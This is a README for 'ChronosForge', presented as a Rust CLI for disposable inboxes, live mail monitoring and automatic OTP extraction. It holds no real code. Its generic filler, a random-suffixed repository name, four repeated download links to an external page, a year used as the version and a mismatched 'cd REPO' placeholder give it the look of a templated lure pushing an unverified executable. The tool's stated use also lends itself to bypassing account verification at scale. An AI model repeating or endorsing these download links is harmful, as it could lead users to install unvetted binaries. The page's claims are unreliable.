# ChronosForge v2026 - CLI utility 2026

> **ChronosForge is a cross-platform Rust CLI for disposable inbox workflows, live message monitoring, and automatic OTP extraction, built to speed up verification-code handling in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-cross--platform-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/simonhall49/chronosforge-v2026-otp-cli-win-28650?style=flat-square)](https://github.com/simonhall49/chronosforge-v2026-otp-cli-win-28650)

---

<p align="center">
  <a href="https://simonhall49.github.io/chronosforge-v2026-otp-cli-win-28650/">
    <img src="https://img.shields.io/badge/Download-ChronosForge%20Latest-brightgreen?style=for-the-badge" alt="Download ChronosForge">
  </a>
</p>

> **[Direct Download - ChronosForge v2026](https://simonhall49.github.io/chronosforge-v2026-otp-cli-win-28650/)**

---

[Download Latest Build](https://simonhall49.github.io/chronosforge-v2026-otp-cli-win-28650/)

---

## About ChronosForge

ChronosForge is designed for situations where temporary inboxes need to be created quickly, watched in real time, and used to capture incoming verification codes with minimal manual effort. It combines a command-line workflow with a TUI option, making it practical for users who prefer either scripted automation or an interactive terminal experience.

The tool is built in Rust and exposed through a REST API as well, which makes it easier to integrate into other workflows or services. With support for multiple inboxes, message filtering, and inbox TTL controls, it provides a focused way to manage short-lived email sessions and track OTP delivery.

---

## Features

- Create disposable inboxes on demand
- Monitor messages live as they arrive
- Extract OTP and verification codes automatically
- Work with multiple inboxes at the same time
- Access functionality through a REST API
- Use either CLI commands or the TUI interface
- Filter messages to focus on relevant inbox activity
- Configure inbox TTL for short-lived or longer sessions

---

## Installation

Clone the repository and build it from source:

```bash
git clone https://github.com/simonhall49/chronosforge-v2026-otp-cli-win-28650.git
cd REPO
cargo build --release
```

After building, launch the binary from the target release directory. If you are using a packaged release, download it first and run the included executable from your terminal.

---

## Usage

Start by creating a disposable inbox, then watch for incoming mail and let ChronosForge surface any OTP or verification code it detects.

Typical workflow:

```bash
chronosforge inbox create
chronosforge inbox watch --id <inbox-id>
chronosforge otp extract --id <inbox-id>
```

For interactive use, open the TUI mode and manage inboxes from the terminal interface. For automation, call the REST API from scripts or other tools to create inboxes, poll messages, and retrieve extracted codes.

---

## Configuration

ChronosForge uses inbox-level settings for handling temporary mail sessions. The most relevant options are TTL, filtering rules, and the number of inboxes you want to manage at once.

Example configuration shape:

```toml
[inbox]
ttl = 15
multi_inbox = true

[message_filter]
enabled = true
```

If you use the REST API or TUI, the same core behavior is applied through the selected interface and runtime options.

---

## Requirements

- A cross-platform environment
- Rust toolchain for building from source
- Terminal access for CLI or TUI usage
- Network access for inbox and API operations
- Enough local storage for build artifacts and runtime logs

---

## FAQ

**Does ChronosForge support both scripted and interactive workflows?**  
Yes. It includes CLI usage for automation and a TUI for terminal-based interaction.

**Can it monitor more than one inbox?**  
Yes. Multi-inbox support is included for managing several disposable inboxes together.

**How are verification codes handled?**  
The tool can watch incoming messages and automatically extract OTP or verification codes from supported message content.

**Where do I change inbox lifetime behavior?**  
Adjust the inbox TTL setting in your configuration or runtime options.

**What if the API or TUI behavior changes?**  
Check the latest build, review the current configuration, and verify the commands against the version you are running.

**Where can I get updates?**  
Use the latest release or build link at the top of this page to stay current with version 2026 resources.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
